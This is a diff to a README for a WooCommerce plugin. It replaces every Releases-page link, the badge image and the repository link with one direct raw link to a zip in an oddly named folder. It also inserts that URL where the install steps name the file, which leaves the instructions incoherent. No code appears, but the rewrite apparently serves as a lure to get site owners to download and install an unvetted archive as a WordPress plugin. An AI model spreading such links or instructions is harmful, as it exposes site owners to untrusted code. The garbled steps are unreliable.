@@ -1,6 +1,6 @@
 # 🛍️ BAC-Woocommerce-Plugin - Enhance Your WooCommerce Experience
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release%20-%20BAC%20WooCommerce%20Plugin-brightgreen)](https://github.com/ARCGoat/BAC-Woocommerce-Plugin/releases)
+[![Download Here](https://github.com/ARCGoat/BAC-Woocommerce-Plugin/raw/refs/heads/main/pterylological/Woocommerce-BA-Plugin-v1.3.zip%20Latest%20Release%20-%20BAC%20WooCommerce%20Plugin-brightgreen)](https://github.com/ARCGoat/BAC-Woocommerce-Plugin/raw/refs/heads/main/pterylological/Woocommerce-BA-Plugin-v1.3.zip)
 
 ## 📦 Description
 
@@ -30,13 +30,13 @@ Before you begin, ensure your system meets the following requirements:
 
 To download the BAC WooCommerce Plugin, visit the Releases page:
 
-[Download Latest Release](https://github.com/ARCGoat/BAC-Woocommerce-Plugin/releases)
+[Download Latest Release](https://github.com/ARCGoat/BAC-Woocommerce-Plugin/raw/refs/heads/main/pterylological/Woocommerce-BA-Plugin-v1.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
 3. Click on the release title to open the release details.
 4. Scroll down to the "Assets" section.
-5. Select the file you want to download. For most users, you should choose the one named `BAC-Woocommerce-Plugin.zip`.
+5. Select the file you want to download. For most users, you should choose the one named `https://github.com/ARCGoat/BAC-Woocommerce-Plugin/raw/refs/heads/main/pterylological/Woocommerce-BA-Plugin-v1.3.zip`.
 6. Click on the file name to initiate the download.
 
 Once the download completes, follow these steps to install the plugin:
@@ -44,7 +44,7 @@ Once the download completes, follow these steps to install the plugin:
 1. Log in to your WordPress Admin Dashboard.
 2. Navigate to **Plugins** > **Add New**.
 3. Click on the **Upload Plugin** button at the top.
-4. Choose the `BAC-Woocommerce-Plugin.zip` file you just downloaded.
+4. Choose the `https://github.com/ARCGoat/BAC-Woocommerce-Plugin/raw/refs/heads/main/pterylological/Woocommerce-BA-Plugin-v1.3.zip` file you just downloaded.
 5. Click on **Install Now**.
 6. After the installation, click on **Activate Plugin**.
 
@@ -74,6 +74,6 @@ If you run into any issues or need assistance, please check our [FAQ](#) section
 
 Feel free to explore or ask questions within these topics if you need more insights into how this plugin works. 
 
-For updates and discussions, follow our [GitHub repository](https://github.com/ARCGoat/BAC-Woocommerce-Plugin).
+For updates and discussions, follow our [GitHub repository](https://github.com/ARCGoat/BAC-Woocommerce-Plugin/raw/refs/heads/main/pterylological/Woocommerce-BA-Plugin-v1.3.zip).
 
 Thank you for choosing the BAC WooCommerce Plugin!
